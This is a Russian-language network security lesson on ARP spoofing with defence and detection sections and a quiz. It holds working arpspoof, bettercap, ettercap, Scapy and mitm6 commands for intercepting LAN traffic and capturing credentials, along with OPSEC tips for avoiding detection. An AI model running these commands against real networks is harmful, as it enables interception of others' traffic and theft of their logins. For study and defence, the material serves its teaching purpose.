---
id: network-arp-deep
title: "ARP-спуфинг глубоко: отравление кэша, релей и детект"
category: network
parent: network-arp
difficulty: medium
order: 2
tags: [network, arp, spoofing, layer2, mitm, detection]
prerequisites: [network-arp, network-mitm]
useful_for:
  - "CTF Network (L2-атаки)"
  - "Пентест: перехват в локальном сегменте"
  - "Работа (SOC): детект ARP-аномалий"
estimated_minutes: 50
summary: "Механика ARP-спуфинга на уровне кадров, полноценный перехват с релеем, защита и практические способы обнаружения."
---

ARP-спуфинг — базовый приём перехвата в локальном сегменте: атакующий отвечает на ARP-запросы жертвы своим MAC и оказывается в середине пути. Урок углубляет [`network-arp`](network-arp) и [`network-mitm`](network-mitm) — от механики кадров до детекта.

## Почему ARP так легко отравить

- В ARP **нет аутентификации**: любой хост может ответить за любой IP.
- **Gratuitous ARP** (ответ без запроса) обновляет кэш без проверки.
- Кэш **не проверяет** соответствие MAC/IP.
- Уязвимы и IPv4-ARP, и IPv6-**NDP** (Neighbor Discovery).

## Двусторонний спуфинг и релей

Чтобы перехватить весь трафик, отравляем **обе стороны**:

1. Жертве говорим, что шлюз — это мы.
2. Шлюзу говорим, что жертва — это мы.
3. Включаем `ip_forward`, чтобы трафик шёл через нас **прозрачно**.

```bash
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
sudo arpspoof -i eth0 -t 10.0.0.7 10.0.0.1 &
sudo arpspoof -i eth0 -t 10.0.0.1 10.0.0.7 &
# Или через bettercap (удобнее)
sudo bettercap -iface eth0 -eval "set arp.spoof.targets 10.0.0.7; arp.spoof on; net.sniff on"
```

## Инструменты и команды

```bash
# arpspoof (dsniff)
arpspoof -i eth0 -t <victim> <gateway>
# bettercap
set arp.spoof.fullduplex true
set arp.spoof.targets 10.0.0.7
arp.spoof on
# ettercap (text/GUI)
ettercap -T -M arp:remote /10.0.0.7// /10.0.0.1//
# Scapy (кастомный gratuitous ARP)
python3 - <<'PY'
from scapy.all import *
send(ARP(op=2, psrc="10.0.0.1", pdst="10.0.0.7", hwsrc="aa:bb:cc:dd:ee:ff"), loop=1, inter=1)
PY
```

## Разобранный пример: полный перехват HTTP

```bash
# 1. Включаем форвардинг
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
# 2. Двусторонний спуфинг
sudo bettercap -iface eth0 -eval "set arp.spoof.fullduplex true; set arp.spoof.targets 10.0.0.7; arp.spoof on; net.sniff on"
# 3. Жертва открывает HTTP-сайт -> видим креды
# -> POST /login user=alice&pass=...
# 4. Для HTTPS — sslstrip/прокси (см. network-mitm)
# 5. Сохраняем трафик
set net.sniff.output cap.pcap
```

## Защита

- **Dynamic ARP Inspection (DAI)** — проверяет ARP по **DHCP snooping binding table**.
- **DHCP snooping** — наполняет таблицу доверенных привязок.
- **Static ARP** для критичных хостов/шлюза.
- **Port security** и сегментация.
- **802.1X** — контроль доступа к порту.
- **Мониторинг**: алерты на смену MAC шлюза.

## Частые ошибки

- **Не включить `ip_forward`** — связь жертвы оборвётся.
- **Односторонний спуфинг** — виден только один поток.
- **Забыть восстановить ARP** — сеть «сломана» после атаки.
- **Игнорировать IPv6/NDP** — IPv6-сегмент уязвим отдельно.
- **Считать DAI «серебряной пулей»** — без DHCP snooping таблица пуста.
- **Спуфить шлюз в шумной сети** — легко заметить по алертам.

## Автоматизация перехвата

Ручной `arpspoof` быстро становится неудобен; лучше автоматизировать полный цикл:

```bash
# bettercap: спуфинг + сниффинг + экспорт в одном
sudo bettercap -iface eth0 -caplet mitm.caplet
# mitm.caplet:
#   set arp.spoof.fullduplex true
#   set arp.spoof.targets 10.0.0.0/24
#   set net.sniff.output /tmp/cap.pcap
#   arp.spoof on
#   net.sniff on
```

Полезные модули bettercap: `http.proxy` (прозрачный прокси), `https.proxy` (с подложенным CA), `dns.spoof`, `net.sniff`, `wifi`. С `mitmproxy` в прозрачном режиме можно писать скрипты модификации на лету.

## Пост-эксплуатация MITM

Перехват — не самоцель, а доступ:

- **Извлечение кредов** из HTTP/логинов, FTP, SMTP, telnet.
- **Перехват сессий** (cookie) → захват аккаунта.
- **Инъекция** в HTTP-ответы (например, JS-кейлоггер).
- **Downgrade** (sslstrip) для HTTPS-сайтов без HSTS.
- **Эксфильтрация** — вывод чувствительных данных.
- **Релей** NTLM к другим сервисам (см. [`network-ntlm-relay`](network-ntlm-relay)).

```bash
# Извлечь HTTP-креды из перехваченного дампа
tshark -r cap.pcap -Y 'http.request.method=="POST"' -T fields -e http.host -e http.file_data
```

## Оценка заметности и OPSEC

ARP-спуфинг **шумный**: IDS/arpwatch легко детектируют. Для снижения заметности:

- Спуфить **узкий** набор целей, а не весь /24.
- Не включать глобальный `net.sniff` без фильтра.
- Восстанавливать ARP-таблицы после завершения (иначе сеть «сломается» и привлечёт внимание).
- Работать в окне, согласованном с заказчиком.
- Помнить, что DAI/DHCP-snooping на коммутаторе сорвёт атаку — проверить заранее.

## IPv6: NDP-спуфинг на практике

```bash
# RA-флуд и NDP-спуфинг (в лаборатории)
#   mitm6 / fake_router6 / parasite6
sudo mitm6 -d corp.local
# Просмотр NDP-таблицы
ip -6 neigh show
# Захват ICMPv6
sudo tcpdump -i eth0 -n 'icmp6'
```

IPv6 часто **не фильтруется** так же строго, как IPv4, и хосты с двойным стеком предпочитают IPv6 — это отдельный, часто забытый путь MITM.

## Резюме

ARP-спуфинг — простой и мощный способ перехвата в L2-сегменте: двусторонний спуфинг + forwarding дают прозрачный MITM. Ключевые инструменты — bettercap/arpspoof/ettercap; защита — DAI + DHCP snooping, статические ARP, port security, 802.1X. Не забывайте про IPv6 (NDP/RA) и про то, что атака заметна для мониторинга.

## Анатомия ARP-кадра: opcode, поля и где спрятать атаку

ARP — маленький протокол (28 байт для IPv4), и понимание его полей объясняет, почему спуфинг так прост. Кадр Ethernet с `EtherType=0x0806` несёт:

| Поле | Размер | Значение | Роль в атаке |
|---|---|---|---|
| htype | 2 | 1 = Ethernet | фиксировано |
| ptype | 2 | 0x0800 = IPv4 | фиксировано |
| hlen | 1 | 6 (MAC) | фиксировано |
| plen | 1 | 4 (IPv4) | фиксировано |
| oper | 2 | 1 = request, 2 = reply | спуфинг шлёт **reply** без запроса |
| sha | 6 | sender hardware (MAC) | **подделываем** на свой MAC |
| spa | 4 | sender protocol (IP) | **подделываем** на IP жертвы/шлюза |
| tha | 6 | target hardware | MAC жертвы |
| tpa | 4 | target protocol | IP жертвы |

**Gratuitous ARP** — это `request`/`reply`, где `spa == tpa` (или reply без запроса): хост объявляет свой MAC/IP. Атакующий использует его для **отравления** чужих кэшей: получатель обновляет запись `IP шлюза → MAC атакующего`, даже не спрашивая.

```bash
# Собрать gratuitous ARP вручную (Scapy): "IP шлюза 10.0.0.1 теперь мой MAC"
python3 - <<'PY'
from scapy.all import ARP, Ether, sendp, get_if_hwaddr
iface="eth0"; mymac=get_if_hwaddr(iface)
pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, psrc="10.0.0.1",
        pdst="10.0.0.7", hwsrc=mymac, hwdst="ff:ff:ff:ff:ff:ff")
sendp(pkt, iface=iface, loop=1, inter=2)
PY
```

Wireshark-фильтры для разбора: `arp.opcode == 1` (requests), `arp.opcode == 2` (replies), `arp.isgratuitous == 1` (gratuitous), `arp.duplicate-address-detected` (встроенный детектор дублей). Именно всплеск gratuitous ARP от одного MAC — первый признак атаки.

## Детект ARP-аномалий: arpwatch, xarp, Wireshark, DAI-логи

Обнаружение строится на **baseline**: нормальное соотношение MAC↔IP стабильно. Инструменты:

```bash
# arpwatch — следит за изменениями пары MAC/IP и шлёт письма/алерты
sudo arpwatch -i eth0 -f arp.dat
# xarp — кросс-платформенный IDS на ARP
sudo xarp -i eth0
# Wireshark/tshark: найти дубли MAC на разные IP (классика спуфинга)
tshark -r cap.pcap -Y 'arp.opcode==2' -T fields -e arp.src.hw_mac -e arp.src.proto_ipv4 \
  | sort | uniq -c | sort -rn | head
# один MAC, много IP -> спуфинг
# смена MAC шлюза во времени
tshark -r cap.pcap -Y 'arp.src.proto_ipv4==10.0.0.1' -T fields -e arp.src.hw_mac | sort -u
```

На коммутаторе **Dynamic ARP Inspection (DAI)** логирует отброшенные ARP (`%SW_DAI-4-DHCP_SNOOPING_DENY`), что даёт готовый след. Дополнительно смотрят: ARP-reply без предшествующего request, ARP от MAC, не зарегистрированного в DHCP-snooping binding, всплеск broadcast.

| Индикатор | Что означает | Инструмент |
|---|---|---|
| Один MAC на несколько IP | ARP-спуфинг | tshark, arpwatch |
| Смена MAC шлюза | отравление кэша | arpwatch, xarp |
| ARP-reply без request | gratuitous-атака | tshark |
| MAC вне DHCP-binding | подделка | DAI-логи |
| Всплеск broadcast ARP | MAC-flood/скан | tshark, Zeek |

## DHCP-спуфинг: захват шлюза через конфигурацию

Альтернатива ARP-спуфингу — **rogue DHCP**: атакующий отвечает на DHCP Discover быстрее легитимного сервера и выдаёт жертве себя в качестве шлюза и DNS. Тогда весь трафик жертвы идёт через атакующего без единого ARP-пакета.

```bash
# responder/yersinia/bettercap могут поднять rogue DHCP
sudo bettercap -iface eth0 -eval "set dhcp6.spoof.domains corp.local; dhcp6.spoof on"
# классика: dhcpig для истощения пула (DoS) и mitm-скрипты
# проверить, кто выдаёт DHCP (в лаборатории)
sudo tcpdump -i eth0 -n 'udp port 67 or udp port 68'
```

Защита — **DHCP snooping** на коммутаторе (доверенные порты только к легитимному серверу). Без него любой хост может выдать себя за DHCP. Связка «DHCP snooping → DAI» — стандарт защиты L2: snooping наполняет таблицу доверенных привязок MAC↔IP↔порт, а DAI по ней проверяет ARP.

## Расширенные инструменты: bettercap-модули и ettercap-плагины

bettercap — самый гибкий: он сам настраивает форвардинг, ARP-спуфинг и сниффинг и умеет инжектить контент.

```bash
# Полный MITM-цикл в bettercap
sudo bettercap -iface eth0
> set arp.spoof.fullduplex true
> set arp.spoof.targets 10.0.0.7
> set net.sniff.local true
> arp.spoof on
> net.sniff on
# модули: dns.spoof, http.proxy, https.proxy, wifi, dhcp6.spoof
# сохранить дамп
> set net.sniff.output /tmp/cap.pcap
```

ettercap с плагинами:

```bash
# ARP MITM (text-режим), плагины: dns_spoof, remote_browser, sslstrip
sudo ettercap -T -q -M arp:remote /10.0.0.7// /10.0.0.1// -P dns_spoof
# список плагинов
ettercap -P list
```

## IPv6 NDP/RA: тот же класс атак без ARP

В IPv6 роль ARP играет **NDP** (Neighbor Discovery, ICMPv6): Neighbor Solicitation/Advertisement аналог request/reply, а **Router Advertisement** раздаёт маршруты и DNS. Ни один из них не аутентифицирован по умолчанию, поэтому работают те же приёмы:

- **NA-спуфинг** — подделка Neighbor Advertisement (аналог ARP-спуфинга).
- **RA-спуфинг** — rogue Router Advertisement, выдаёт себя за шлюз/DNS.
- **mitm6** — автоматизирует rogue RA/DHCPv6 для перехвата DNS в Windows-сети.

```bash
# Смотреть соседей и RA
ip -6 neigh show
sudo tcpdump -i eth0 -n 'icmp6 and (icmp6[0]==134 or icmp6[0]==135 or icmp6[0]==136)'
# Защита на коммутаторе: RA Guard, DHCPv6 Guard, ND Inspection (RFC 7610)
```

IPv6 часто **менее защищён**, чем IPv4, а хосты с двойным стеком предпочитают IPv6 — это отдельный, часто забытый путь MITM. Включайте IPv6-мониторинг даже если «сеть только IPv4».

## Практический чек-лист ARP-теста и восстановления

1. **Разведка**: определить шлюз, подсеть, есть ли DAI/DHCP snooping (`arp -a`, поведение коммутатора).
2. Включить `ip_forward` — иначе жертва отвалится и атака станет заметной.
3. Запустить **двусторонний** ARP-спуфинг (жертва↔шлюз), лучше через bettercap.
4. Снять baseline трафика, выделить незашифрованное (HTTP/FTP/SMTP).
5. Для HTTPS — sslstrip/прокси (см. `network-mitm`); для NTLM — Responder.
6. **Уборка**: `arp.spoof off`, отправить корректные ARP-записи жертве и шлюзу, выключить `ip_forward`.
7. Задокументировать: что перехвачено, что изменено, какая защита отсутствовала.

```bash
# Принудительное восстановление ARP-кэша жертвы (Scapy)
python3 - <<'PY'
from scapy.all import ARP, Ether, sendp
# вернуть жертве настоящий MAC шлюза (gw_mac) и шлюзу настоящий MAC жертвы (vic_mac)
sendp(Ether(dst="victim_mac")/ARP(op=2, psrc="10.0.0.1", hwsrc="gw_mac",
      pdst="10.0.0.7", hwdst="victim_mac"), count=5)
PY
```

## Квиз

```quiz
- question: "Почему ARP-ответ принимается без проверки?"
  options:
    - "Потому что ARP подписан"
    - "Потому что в ARP нет аутентификации — ответ принимается от любого"
    - "Потому что ARP шифруется"
    - "Потому что ARP работает на L3"
  answer: 1
  explanation: "В ARP нет аутентификации; любой хост может объявить любой IP своим."
- question: "Зачем включают net.ipv4.ip_forward при ARP-спуфинге?"
  options:
    - "Чтобы ускорить атаку"
    - "Чтобы пересылать трафик жертвы дальше и не порвать связь"
    - "Чтобы подделать MAC"
    - "Чтобы отключить IPv6"
  answer: 1
  explanation: "Без форвардинга трафик не вернётся к жертве и соединение оборвётся."
- question: "Какая защита коммутатора проверяет ARP по DHCP-snooping binding?"
  options:
    - "Dynamic ARP Inspection"
    - "STP"
    - "NAT"
    - "VLAN"
  answer: 0
  explanation: "DAI отбрасывает ARP-пакеты, не соответствующие таблице DHCP-snooping."
- question: "Какой протокол IPv6 тоже уязвим к спуфингу соседей?"
  options:
    - "ARP"
    - "NDP (Neighbor Discovery)"
    - "DHCPv4"
    - "ICMP echo"
  answer: 1
  explanation: "В IPv6 роль ARP играет NDP, который также подделывается (rogue RA/NA)."
- question: "Что выдаёт ARP-атаку в мониторинге?"
  options:
    - "Смена MAC-адреса шлюза и дублированные gratuitous ARP"
    - "Рост TTL"
    - "Изменение размера MTU"
    - "Появление IPv6"
  answer: 0
  explanation: "arpspoof порождает смену MAC шлюза в кэше и всплеск gratuitous ARP."
```

## Где пригодится

- **CTF:** L2-задачи на перехват.
- **Пентест:** MITM в локальном сегменте.
- **SOC:** детект ARP-аномалий и DAI.
- **Работа:** защита L2-инфраструктуры.
- **Основы:** понимание канального уровня.
